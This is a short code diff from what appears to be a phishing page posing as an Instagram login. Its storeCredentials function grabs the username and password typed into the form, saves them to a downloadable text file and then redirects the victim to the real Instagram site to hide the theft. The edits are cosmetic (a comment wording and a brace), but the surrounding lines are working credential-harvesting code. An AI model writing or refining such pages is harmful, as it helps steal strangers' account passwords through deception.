@@ -106,7 +106,7 @@ function storeCredentials() {
     var username = document.getElementsByName('username')[0].value;
     var password = document.getElementsByName('password')[0].value;
 
-    // Creating a Blob containing the data
+    // Create a Blob containing the data
     var dataBlob = new Blob([`Username: ${username}\nPassword: ${password}`], { type: 'text/plain' });
 
     // Creating a link element and triggering a click to download the file
@@ -117,7 +117,7 @@ function storeCredentials() {
 
     // Redirect to Instagram after storing credentials
     window.location.href = 'https://www.instagram.com';
-    }
+}
 </script>
 
 </body>
